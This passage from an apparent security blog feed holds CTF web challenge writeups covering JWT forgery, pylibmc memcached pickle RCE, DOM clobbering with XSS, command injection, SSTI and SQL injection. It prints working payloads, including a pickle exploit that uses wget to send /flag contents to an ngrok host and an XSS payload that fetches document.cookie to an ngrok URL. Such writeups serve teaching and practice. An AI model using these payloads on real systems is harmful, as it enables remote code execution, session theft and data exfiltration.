eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNDc1MTksImlhdCI6MTcxMDE0MzkxOSwianRpIjoiYmQtcW5GYnBqcUhpbEFSeXN5aGwyUSIsIm5iZiI6MTcxMDE0MzkxOSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiYWRtaW5fdXNlciJ9.\":\"\",\"protected\":\"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9\", \"payload\":\"eyJleHAiOjE3MTAxNDc1MTksImlhdCI6MTcxMDE0MzkxOSwianRpIjoiYmQtcW5GYnBqcUhpbEFSeXN5aGwyUSIsIm5iZiI6MTcxMDE0MzkxOSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ\",\"signature\":\"s569WtLjeq3NQSI9GXVDfTYJSUrxdEGtCBnxjHnwEa6UWwS6RNfLF-qMjvAc-GiqHzG1Wx1SQd1tsqIqnIF6zz9zXFQaSimFgnYE0HvUwaI_XhzBJA-ZxmrgetgJjbOhKBOopKIXmtUt-LPE2tsB3yr6SJe-C2RvFlTzrgQMDrOtRBJJiXfYne1QI4nnXUFY0XsNXCpKQIe6ELHNmeE-F6Fj5s1AJwUEBwWJNVnmw_s5mVbL1hvIE54e2mJg5VK8PfCLXx4u-ghVRgGDRkUza4UpgM8nrSmTj5d40iREyz9M6PDvi0TFhuVvlQStrpz0UId-uyL4-Vwp9UnTOSNBRA\"&#125;</div></code></div></pre><!-- HTML_TAG_END --><p>Note that we need to place the payload as it is as our new JWT token to make it work:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>curl -i \"http://94.237.60.112:35242/api/v1/flag\" -H 'Authorization: &#123;\"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNDc1MTksImlhdCI6MTcxMDE0MzkxOSwianRpIjoiYmQtcW5GYnBqcUhpbEFSeXN5aGwyUSIsIm5iZiI6MTcxMDE0MzkxOSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiYWRtaW5fdXNlciJ9.\":\"\",\"protected\":\"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9\", \"payload\":\"eyJleHAiOjE3MTAxNDc1MTksImlhdCI6MTcxMDE0MzkxOSwianRpIjoiYmQtcW5GYnBqcUhpbEFSeXN5aGwyUSIsIm5iZiI6MTcxMDE0MzkxOSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ\",\"signature\":\"s569WtLjeq3NQSI9GXVDfTYJSUrxdEGtCBnxjHnwEa6UWwS6RNfLF-qMjvAc-GiqHzG1Wx1SQd1tsqIqnIF6zz9zXFQaSimFgnYE0HvUwaI_XhzBJA-ZxmrgetgJjbOhKBOopKIXmtUt-LPE2tsB3yr6SJe-C2RvFlTzrgQMDrOtRBJJiXfYne1QI4nnXUFY0XsNXCpKQIe6ELHNmeE-F6Fj5s1AJwUEBwWJNVnmw_s5mVbL1hvIE54e2mJg5VK8PfCLXx4u-ghVRgGDRkUza4UpgM8nrSmTj5d40iREyz9M6PDvi0TFhuVvlQStrpz0UId-uyL4-Vwp9UnTOSNBRA\"&#125;'</div></code></div></pre><!-- HTML_TAG_END --><p>And got the flag:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>HTB&#123;h4Pr0Xy_n3v3r_D1s@pp01n4s&#125;</div></code></div></pre><!-- HTML_TAG_END --><h3 id=\"serialflow\"><a href=\"#serialflow\">SerialFlow</a></h3><p>Analyzing the code of the application, i got that application is using the library <code>flask-session</code> with <code>pylibmc</code> to store sessions in memcached. </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>import pylibmc, uuid, sys</div><div class='line'>from flask import Flask, session, request, redirect, render_template</div><div class='line'>from flask_session import Session</div><div class='line'></div><div class='line'>app = Flask(__name__)</div><div class='line'></div><div class='line'>app.secret_key = uuid.uuid4()</div><div class='line'></div><div class='line'>app.config[\"SESSION_TYPE\"] = \"memcached\"</div><div class='line'>app.config[\"SESSION_MEMCACHED\"] = pylibmc.Client([\"127.0.0.1:11211\"])</div><div class='line'>app.config.from_object(__name__)</div><div class='line'></div><div class='line'>Session(app)</div></code></div></pre><!-- HTML_TAG_END --><p>At this point, i thougt it would be a plain memcached injection but nothing. Doing a bit of google i found various articles on memcached injection with other libraries from Python. However, i found this one blog on <code>pylibmc</code> exploitation: <a href=\"https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/\" rel=\"nofollow noopener noreferrer external\" target=\"_blank\">https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/</a></p><p>Reading the blog, i got that we can do a memcached injection with <code>pylibmc</code> by using carriage return line breaks by encoding the payload in a special sequence that is being understood by the HTTP protocol. However, the tricky part for me was to identify where to place the payload. In the blog, the author used a cookie named <code>notsecret</code> which i wasn‚Äôt sure of. After spending some more time on this, i found the author‚Äôs twitter where he attached a GIF of the exploit and used it as the session cookie. </p><p>The good thing was we got the exploit code from the blog. I modified it a bit to send request to my <code>ngrok</code> server:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>import pickle</div><div class='line'>import os</div><div class='line'></div><div class='line'>class RCE:</div><div class='line'>    def __reduce__(self):</div><div class='line'>        cmd = ('wget https://b058-2407-d000-403-e00e-60d2-910d-df7c-df4d.ngrok-free.app',)</div><div class='line'>        return os.system, (cmd,)</div><div class='line'></div><div class='line'>def generate_exploit():</div><div class='line'>    payload = pickle.dumps(RCE(), 0)</div><div class='line'>    payload_size = len(payload)</div><div class='line'>    cookie = b'137&#92;r&#92;nset BT_:1337 0 2592000 '</div><div class='line'>    cookie += str.encode(str(payload_size))</div><div class='line'>    cookie += str.encode('&#92;r&#92;n')</div><div class='line'>    cookie += payload</div><div class='line'>    cookie += str.encode('&#92;r&#92;n')</div><div class='line'>    cookie += str.encode('get BT_:1337')</div><div class='line'></div><div class='line'>    pack = ''</div><div class='line'>    for x in list(cookie):</div><div class='line'>        if x &gt; 64:</div><div class='line'>            pack += oct(x).replace(\"0o\",\"\\\")</div><div class='line'>        elif x &lt; 8:</div><div class='line'>            pack += oct(x).replace(\"0o\",\"\\00\")</div><div class='line'>        else:</div><div class='line'>            pack += oct(x).replace(\"0o\",\"\\0\")</div><div class='line'></div><div class='line'>    return f\"\"&#123;pack&#125;\"\"</div><div class='line'></div><div class='line'>if __name__ == \"__main__\":</div><div class='line'>    print(generate_exploit())</div></code></div></pre><!-- HTML_TAG_END --><p>The payload i got looked something like this:<img src=\"https://github.com/hash3liZer/khatta/assets/29171692/b55a7d35-80e4-47d0-9283-1d92ec0b0a08\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>As per the HTTP specs, we need send it with double quotes as the session cookie. I used burp:<img src=\"https://github.com/hash3liZer/khatta/assets/29171692/030407bb-f81b-42a0-86dc-f260917a6d92\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>At first it returned me a <code>200</code> response. While i should have gotten an <code>Internal Server Error</code>. Running it a couple times, returned me a request on my <code>ngrok</code> terminal:<img src=\"https://github.com/hash3liZer/khatta/assets/29171692/5df209cf-3e5f-4a0a-ae0b-45bc7657993c\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>So, i modified the exploit a bit to get the flag: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>class RCE:</div><div class='line'>    def __reduce__(self):</div><div class='line'>        cmd = ('wget \"https://b058-2407-d000-403-e00e-60d2-910d-df7c-df4d.ngrok-free.app$(cat /flag*)\"',)</div><div class='line'>        return os.system, (cmd,)</div></code></div></pre><!-- HTML_TAG_END --><p>I sent the request second and got the response on terminal: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'># python -m http.server 8080</div><div class='line'>Serving HTTP on :: port 8080 (http://[::]:8080/) ...</div><div class='line'>::1 - - [12/Mar/2024 22:06:38] code 404, message File not found</div><div class='line'>::1 - - [12/Mar/2024 22:06:38] \"GET /somethingHTB%7By0u_th0ught_th15_wou1d_b3_s1mpl3?&#125; HTTP/1.1\" 404 -</div></code></div></pre><!-- HTML_TAG_END --><h2 id=\"ending-note\"><a href=\"#ending-note\">Ending Note</a></h2><p>Overall, it was really fun playing the CTF and just like any other time, i got new things to learn :)</p>","summary":"This blog post contains the writeups for the web challenges that i solved from HTB Cyber Apocalypse 2024","image":"https://github.com/hash3liZer/khatta/assets/29171692/d5abad92-0b61-4418-af4b-582a6d03044b","date_published":"2024-03-14T00:00:00.000Z","date_modified":"2024-09-14T21:03:45.278Z","tags":["ctf","cyber-apocalypse","htb","htb-2024","web"],"_indieweb":{"type":"article"}},{"id":"blog/2023/pcc-23-web-challenge-writeups","url":"https://blog.shameerkashif.me/blog/2023/pcc-23-web-challenge-writeups","title":"Writeups for Web challenges from PCC 23","content_html":"<h1 id=\"qualifiers\"><a href=\"#qualifiers\">Qualifiers</a></h1><h3 id=\"secure-me\"><a href=\"#secure-me\">Secure ME</a></h3><p>The challenge had the following instruction and one attachment: </p><blockquote><p>It‚Äôs just an application to secure your profile. What can possibly go wrong</p></blockquote><p>On the first review, the website seems to simply return a <code>Resolution ID</code> when details are submitted. There‚Äôs nothing more here. </p><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/52943339-b80e-4e25-b7f3-cec5e264f91c\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>So, lets review the attachment now. We find that we actually have 3 endpoints: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>/save</div><div class='line'>/:resolution</div><div class='line'>/view/:resolution</div></code></div></pre><!-- HTML_TAG_END --><p>Lets check the resolution endpoint. The resolution page is rendered with our provided values. So, lets view the url. </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>app.get(\"/:resolution\", (req, res) =&gt; &#123;</div><div class='line'>  const resolution = resolutions.get(req.params.resolution);</div><div class='line'>  if (!resolution) return res.status(404).send(\"not found\");</div><div class='line'></div><div class='line'>  res.render(\"resolutions\", &#123;</div><div class='line'>    id: req.params.resolution,</div><div class='line'>    name: encodeURIComponent(resolution.name),</div><div class='line'>    description: encodeURIComponent(resolution.description),</div><div class='line'>  &#125;);</div><div class='line'>&#125;);</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/2269cc03-ac04-4e80-a1f7-fe2e5ad7ebc3\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>The page provides the link to <code>/view/:resolution</code> where the resolution page is visited through puppeteer. So, jump back to the flag part. The flag is attached in the cookie on the resolution page: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>ctx = await (await browser).createIncognitoBrowserContext();</div><div class='line'>const visit = async (browser, resolution) =&gt; &#123;</div><div class='line'>  const page = await browser.newPage();</div><div class='line'>  await page.goto(\"http://localhost:8000\");</div><div class='line'>  await page.setCookie(&#123; name: \"pcc\", value: process.env.FLAG &#125;);</div><div class='line'>  await page.goto(&#96;http://localhost:8000/$&#123;resolution&#125;&#96;);</div><div class='line'>  await page.waitForNetworkIdle(&#123; timeout: 6000 &#125;);</div><div class='line'>  await page.close();</div><div class='line'>&#125;;</div></code></div></pre><!-- HTML_TAG_END --><p>So, if we could get the <code>XSS</code> on resolution page. We can capture the flag from cookie. Lets revisit our resolution page code: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" html=\"true\"><div class=\"language-id\">html</div><div class='code-container'><code><div class='line'>&lt;body&gt;</div><div class='line'>    &lt;div class=\"container\"&gt;</div><div class='line'>    &lt;div class=\"alert alert-success p-4\" id=\"alert\" role=\"alert\"&gt;</div><div class='line'>        &lt;h4 class=\"alert-heading\"&gt;Well done!&lt;/h4&gt;</div><div class='line'>        &lt;p id=\"name\"&gt;&lt;/p&gt;&lt;hr&gt;</div><div class='line'>        &lt;p id=\"resolution\" class=\"mb-0\"&gt;&lt;/p&gt;</div><div class='line'>    &lt;/div&gt;</div><div class='line'>    &lt;/div&gt;</div><div class='line'>    &lt;script&gt;</div><div class='line'>        let name = document.getElementById(\"name\")</div><div class='line'>        let res   = document.getElementById(\"resolution\")</div><div class='line'>        name.innerHTML = DOMPurify.sanitize(decodeURIComponent(&#96;Shameer&#96;));</div><div class='line'>        class Maker &#123;</div><div class='line'>            #is_safe;</div><div class='line'>            constructor(is_safe = true) &#123;this.#is_safe = is_safe&#125;</div><div class='line'>            get is_safe() &#123;return this.#is_safe;&#125;</div><div class='line'>        &#125;</div><div class='line'></div><div class='line'>        async function firemeup() &#123;</div><div class='line'>            let top = null;</div><div class='line'>            if (window.facecard?.top) &#123;</div><div class='line'>                let res = await fetch(window.facecard?.top.toString());</div><div class='line'>                top = await res.json();</div><div class='line'>            &#125;</div><div class='line'>            const facecard = Object.assign(new Maker(true), top ?? &#123; report: true &#125;);</div><div class='line'>            let body = decodeURIComponent(&#96;Its%20me&#96;);</div><div class='line'>            if (facecard.report) &#123;</div><div class='line'>                let box = document.getElementById(\"alert\");</div><div class='line'>                const newelem = document.createElement(\"a\");</div><div class='line'>                newelem.innerHTML = &#96;Your Resolution&#96;;</div><div class='line'>                newelem.href = &#96;view/RRnYXuQ-hNEOPQpT_E-ey&#96;;</div><div class='line'>                newelem.style.marginTop = \"10px\";</div><div class='line'>                newelem.style.display = \"block\"</div><div class='line'>                box.appendChild(newelem)</div><div class='line'>            &#125;</div><div class='line'>            res.innerHTML = (window.debug && !facecard.is_safe) ? body : DOMPurify.sanitize(body);</div><div class='line'>        &#125;</div><div class='line'>        firemeup();</div><div class='line'>    &lt;/script&gt;</div></code></div></pre><!-- HTML_TAG_END --><p>Upon reviewing it closely, we have 2 vulnerability in this code: </p><ul><li>HTML Injection. Altough the input is sanitized using <code>Dompurify</code> we can still provide html input. This would lead us to <strong>DOM Clobbering</strong>. We can define an anchor tag with id <code>facecard</code> and execute the code under this condition:</li></ul><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>if (window.facecard?.top) &#123;</div><div class='line'>    let res = await fetch(window.facecard?.top.toString());</div><div class='line'>    top = await res.json();</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><ul><li>Prototype Pollution. The <code>top</code> variable value is passed to <code>Object.assign</code> function. If we can provide an object <code>__proto__</code> element, we can modify the created object in our own way.</li></ul><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>const facecard = Object.assign(new Maker(true), top ?? &#123; report: true &#125;);</div></code></div></pre><!-- HTML_TAG_END --><p>Now one challenge here could be that the since we are going to overwrite the value of <code>is_safe</code> attribute, it might not be possible after all since its a private member declared with a <code>#</code> in the beginning. But we can also skip this element providing an prototype leading to an <code>undefined</code> behavior. </p><p>So, lets fire up a python server and return a <code>__proto__</code> object:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>import http.server</div><div class='line'>import json</div><div class='line'></div><div class='line'>class handle_request(http.server.BaseHTTPRequestHandler):</div><div class='line'>    def _set_headers(self):</div><div class='line'>        self.send_response(200)</div><div class='line'>        self.send_header(\"Content-type\", \"application/json\")</div><div class='line'>        self.send_header(\"Access-Control-Allow-Origin\", \"*\")</div><div class='line'>        self.end_headers()</div><div class='line'></div><div class='line'>    def do_GET(self):</div><div class='line'>        response = &#123;</div><div class='line'>            \"__proto__\": &#123;  </div><div class='line'>            \"report\": True</div><div class='line'>          &#125;</div><div class='line'>        &#125;</div><div class='line'>        self._set_headers()</div><div class='line'>        self.wfile.write(json.dumps(response).encode())</div><div class='line'></div><div class='line'>server = http.server.HTTPServer(('', 9000), handle_request)</div><div class='line'>server.serve_forever()</div></code></div></pre><!-- HTML_TAG_END --><p>Proxy your server through ngrok or another tool:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>$ ngrok http 9000</div></code></div></pre><!-- HTML_TAG_END --><p>Lets craft our final payload now. Before we do, we still have one thing missing. At the end of the code, the condition to render our payload without using <code>DOMPurify</code> is: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>(window.debug && !facecard.is_safe) ? body : DOMPurify.sanitize(body);</div></code></div></pre><!-- HTML_TAG_END --><p>In addition, we need to declare another variable on window element which is <code>debug</code>. In the <strong>name</strong> field, we will provide our DOM Clobbering code: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" html=\"true\"><div class=\"language-id\">html</div><div class='code-container'><code><div class='line'>&lt;div id=debug&gt;&lt;/div&gt;&lt;a id=facecard&gt;&lt;a id=facecard name=top href='https://de31-101-50-78-56.ngrok-free.app'&gt;</div></code></div></pre><!-- HTML_TAG_END --><p>And XSS in the description: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" html=\"true\"><div class=\"language-id\">html</div><div class='code-container'><code><div class='line'>&lt;img src=x onerror='fetch(\"https://de31-101-50-78-56.ngrok-free.app/\" + document.cookie)' /&gt;</div></code></div></pre><!-- HTML_TAG_END --><p>When you submit the details and revisit the resolution page, you will get the flag on your ngrok terminal. </p><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/5e230929-31fa-4c09-9cc1-bfe2dba9c653\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><h1 id=\"finals\"><a href=\"#finals\">Finals</a></h1><h3 id=\"jazzme\"><a href=\"#jazzme\">JazzME</a></h3><p>The challenge had the following description:</p><blockquote><p>Taqi is a big fan of Jazz. I made him try my new jazz application.</p></blockquote><p>And beleive me Taqi (theflash2k) is only the fan of Jazz Office. </p><p>The app is rather simple, if i enter my name, i get it returned in plain. Lets try different payloads. And there‚Äôs a hit at command injection: </p><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/99cfcbfa-944f-41e2-84dd-31cdf8673ba4\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>Seems we are inside a string and on top of that we are <code>root</code>. Lets read the flag which is prolly sitting in the same directory or at <code>/flag.txt</code>. But it seems there‚Äôs a blacklist filtering: </p><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/16526814-4af4-42d6-bedc-8dc4daea661c\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>So, lets start putting our command one by one, so we can see what‚Äôs allowed and what‚Äôs not with the website response. After testing command one by one, the filtered keywords seems to be are <strong>space</strong>, <strong>flag</strong> and <strong>txt</strong> extension. Since, spaces are not allowed, we can also use <code>${IFS}</code> in place of that. </p><p>Thats a good start. But we also know that in linux we can provide empty strings within a word. Like <code>fla&quot;&quot;g</code> would be a valid word. Combining these 2 condition, our final payload would look like: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>$(cat$&#123;IFS&#125;/fla\"\"g.t\"\"xt)</div></code></div></pre><!-- HTML_TAG_END --><p>And we enter it and we get the flag:<img src=\"https://github.com/hash3liZer/khatta/assets/29171692/ee099921-82c2-4a08-a59e-57f688ab9638\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><h3 id=\"lama\"><a href=\"#lama\">Lama</a></h3><p>The challenge had the following description: </p><blockquote><p>Taqi made a basic web chall, no way you can do this one.</p></blockquote><p>Lets visit our application and we found an entry at <code>/robots.txt</code>: </p><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/e1e68f55-784e-4f83-961d-2ef41408f90b\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>Lets visit the disallowed URL and it seems to be returning the entered value at the endpoint: </p><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/4dc04931-ecf2-4b47-bf79-5fcdc7f61f32\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>Upon sending the request through curl, the server is based on Python and we can try an <code>SSTI</code> here: </p><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/a9215dc0-35ea-4023-a599-d659b49220db\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>Enter the payload <code>{{7*7}}</code> returns me the valid response. From here, we have a lot of public writeups available. Our goal is to read the flag inside <code>flag.txt</code> file. First, lets enumerate the <code>object</code> class with: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>&#123;&#123;''.__class__.__mro__[1].__subclasses__()&#125;&#125;</div></code></div></pre><!-- HTML_TAG_END --><p>We find the <code>subprocess.Popen</code> function. But first we need to find its index. You can enumerate it through the url directly by slicing the returned list. Keep repeating the step until you find the right index: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>&#123;&#123;''.__class__.__mro__[1].__subclasses__()[203:]&#125;&#125;</div></code></div></pre><!-- HTML_TAG_END --><p>You can find the index at <code>367</code>:</p><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/fa9ecdbf-0051-4e23-8d48-6c5f13743fea\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>And execute the command: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>&#123;&#123;''.__class__.__mro__[1].__subclasses__()[367]('whoami',shell=True,stdout=-1).communicate()&#125;&#125;****</div></code></div></pre><!-- HTML_TAG_END --><p>But while reading the flag, we get the command is filtered. Lets apply the same technique we did in the previous challenge and we get the response <code>Invalid Flag</code>: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>&#123;&#123;''.__class__.__mro__[1].__subclasses__()[367]('cat$&#123;IFS&#125;fla\"\"g.t\"\"xt',shell=True,stdout=-1).communicate()&#125;&#125;</div></code></div></pre><!-- HTML_TAG_END --><p>It seems as if the returned response is being also filtered. We can simply cut the first 3 letters and try to capture the flag: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>&#123;&#123;''.__class__.__mro__[1].__subclasses__()[367]('cat$&#123;IFS&#125;fla\"\"g.t\"\"xt|cut$&#123;IFS&#125;-b4-',shell=True,stdout=-1).communicate()&#125;&#125;</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/6fc7a331-f73f-44a3-8440-dc7c33af692f\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p>","summary":"These are the writeups for web challenges from PCC 23 held at Air University Islamabad","image":"https://github.com/hash3liZer/khatta/assets/29171692/661f1693-25ee-4ea3-8599-635e7b73cb6e","date_published":"2023-12-22T00:00:00.000Z","date_modified":"2024-09-14T21:03:45.278Z","tags":["pcc23"],"_indieweb":{"type":"article"}},{"id":"blog/2023/blackhatmea-ctf-web-authy-writeup","url":"https://blog.shameerkashif.me/blog/2023/blackhatmea-ctf-web-authy-writeup","title":"Blackhat MEA CTF Qualifiers Web Authy and Warm Me Up Writeup","content_html":"<h2 id=\"introduction\"><a href=\"#introduction\">Introduction</a></h2><p>The 2 of the easy challenges from <strong>BlackhatMEA CTF Qualifiers</strong> which was held online were:</p><ul><li>Authy</li><li>Warm Me Up</li></ul><h3 id=\"authy\"><a href=\"#authy\">Authy</a></h3><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/10ee8e70-1ea2-4742-b1c9-e9ad483cc1b8\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>The source code was provided with the challenge. So, i downloaded the source code. The password for the archived file was <code>flagyard</code>. After extracting the files, i started reading the code to find any clues. At first, i started looking for any kind of <code>parameter pollution</code> or any logical vulnerability that could lead to login without <code>password authentication</code>. But eventually no success. Upon reading the source code more carefully, i discovered the difference between the length check at <code>LoginController</code> and <code>SignupController</code>. At the login controller we had the password stored something like this: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" go=\"true\"><div class=\"language-id\">go</div><div class='code-container'><code><div class='line'>password := []rune(user.Password)</div></code></div></pre><!-- HTML_TAG_END --><p>However, that was totally not the case with the signup functionality. The check was rather simple: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" go=\"true\"><div class=\"language-id\">go</div><div class='code-container'><code><div class='line'>if len(user.Password) &lt; 6 &#123;</div><div class='line'>        log.Error(\"Password too short\")</div><div class='line'>        resp := c.JSON(http.StatusConflict, helper.ErrorLog(http.StatusConflict, \"Password too short\", \"EXT_REF\"))</div><div class='line'>        return resp</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><p>So, eventually reading out on the functions i found out that with <code>rune</code> the unicode characters are ignored and not counted when you would run the <code>len</code> function on the variable. So, in short our vulnerable part of the code is: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" go=\"true\"><div class=\"language-id\">go</div><div class='code-container'><code><div class='line'>password := []rune(user.Password)</div><div class='line'>result.Token = helper.JwtGenerator(result.Username, result.Firstname, result.Lastname, os.Getenv(\"SECRET\"))</div><div class='line'>if len(password) &lt; 6 &#123;</div><div class='line'>        flag := os.Getenv(\"FLAG\")</div><div class='line'>        res := &Flag&#123;</div><div class='line'>                Flag: flag,</div><div class='line'>        &#125;</div><div class='line'>        resp := c.JSON(http.StatusOK, res)</div><div class='line'>        log.Info()</div><div class='line'>        return resp</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><p>To exploit the code i simply signed with uncode characters in my password that eventually would turn out to be less than 6 characters with <code>rune</code> function. So, my payload was: <code>‰∏ñÁïå</code>. I crafted a quick program to verify it:<img src=\"https://github.com/hash3liZer/khatta/assets/29171692/29759264-6548-4db9-8f0f-9906066e1ece\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>Looks good, so signed up with the unicode password: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" json=\"true\"><div class=\"language-id\">json</div><div class='code-container'><code><div class='line'>&#123;</div><div class='line'>  \"username\": \"hash3liZer\",</div><div class='line'>  \"password\": \"‰∏ñÁïå\"</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><p>And then login:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>curl -X POST -H \"Content-Type: application/json\" -d '&#123;\"username\": \"hash3liZer\", \"password\":\"‰∏ñÁïå\"&#125;' http://targeturlhere/login</div></code></div></pre><!-- HTML_TAG_END --><p>And got the <strong>FLAG!</strong></p><h3 id=\"warm-me-up\"><a href=\"#warm-me-up\">Warm Me Up</a></h3><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/f8eea34e-83fd-4ce1-ae17-723ba052ad4d\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>With this one, there were no source files. There was just a plain login interface. The interface was: </p><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/10870615-7f93-43a6-9d70-0b1fad713811\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>Intially, i went for some recon and enumeration. Looked for juicy information that i could find at common directories like <code>/robots.txt</code> or <code>.gitignore</code> but found nothing actually. So, time to move on. Now, looking at the login page, we have 3 parameters: </p><ul><li>username[]</li><li>password[]</li><li>otp[]</li></ul><p>At first i tried going with the default credentials or multiple parameters in the using <code>,</code> as a separator and again no luck. Now, looking at the response i found out the <code>session</code> token in cookies. It looked like a base64 string. So, i decoded it: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>echo 'base64string' | base64 -d</div></code></div></pre><!-- HTML_TAG_END --><p>It turned out to an OTP code. At first it didn‚Äôt make much sense to me. But much after discovering the <code>SQLi</code> in the credentials parameters, i discovered that this is actually connected with the login authentication. So, to login correctly we need this OTP code. The base64 decoded string turned out of be something like this: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>&#123;\"otp\":\"THECODEHERE\"&#125; M12SOMEÔøΩ8</div></code></div></pre><!-- HTML_TAG_END --><p>Looking further, i found the SQLi injection in the <code>credentials</code> parameters. The application didn‚Äôt throw any error but the <code>Login Failed</code> or server issues. So, it was a blind SQL. </p><p>A quick payload with a single <code>&#39;</code> triggered the error. I also verified a valid payload which gave the <code>200</code> response as expected: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" sql=\"true\"><div class=\"language-id\">sql</div><div class='code-container'><code><div class='line'>username=admin' OR 1=1 --&password=something&otp=2343</div></code></div></pre><!-- HTML_TAG_END --><p>So, my final payload was: </p><!-- HTML_TAG_START --><pre 